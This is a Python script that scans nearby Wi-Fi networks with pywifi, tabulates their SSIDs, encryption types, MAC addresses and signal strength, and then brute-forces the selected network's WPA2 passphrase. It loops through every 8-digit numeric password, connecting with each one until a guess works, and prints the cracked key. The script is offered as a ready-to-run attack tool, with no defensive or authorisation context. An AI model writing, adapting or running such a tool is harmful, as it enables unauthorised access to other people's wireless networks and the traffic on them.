#Mouad Garroud

import pywifi
from pywifi import const
import pandas as pd
import time
def get_signal_strength(rssi):
    if rssi >= -30:
        return "wonderful"
    elif rssi >= -40:
        return "Amazing"
    elif rssi >= -50:
        return "Excellent"
    elif rssi >= -60:
        return "Good"
    elif rssi >= -70:
        return "Fair"
    elif rssi >= -80:
        return "Weak"
    else:
        return "Very Weak"
def generate_passwords(start, end):
    for num in range(start, end + 1):
        yield str(num).zfill(8)
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
iface.scan()
time.sleep(5)
seen_bssids = set()
scan_results = iface.scan_results()
network_data = []
if scan_results:
    for i, network in enumerate(scan_results):
        encryption_type = "Unknown"
        if network.akm[0] == const.AKM_TYPE_NONE:
            encryption_type = "Open"
        elif network.akm[0] == const.AKM_TYPE_WPA:
            encryption_type = "WPA"
        elif network.akm[0] == const.AKM_TYPE_WPA2:
            encryption_type = "WPA2"
        
        signal_strength = get_signal_strength(network.signal)
        
        if network.bssid not in seen_bssids:
            seen_bssids.add(network.bssid)
            network_data.append({
                "Number": i,
                "SSID": network.ssid,
                "Encryption": encryption_type,
                "MAC": network.bssid,
                "Signal Strength": signal_strength
            })

if network_data:
    df = pd.DataFrame(network_data)
    df.set_index("Number", inplace=True)
    df.drop_duplicates(inplace=True)
    print("Available Networks:")
    print(df)
    print("\n")
    network_number = int(input("Enter the number of the network you want to connect to: "))
    selected_network = scan_results[network_number]
    ssid = selected_network.ssid
    start_connect_time = time.time()
    start_password = 00000000
    end_password = 99999999
    for password in generate_passwords(start_password, end_password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(1.5)
        if iface.status() == const.IFACE_CONNECTED:
            end_connect_time = time.time()
            connection_time = end_connect_time - start_connect_time
            print("Connected successfully to", ssid, "with password:", password)
            print("Connection time:", connection_time, "seconds")
            break
        else:
            print("Failed to connect to", ssid, "with password:", password)
else:
    print("No networks found")
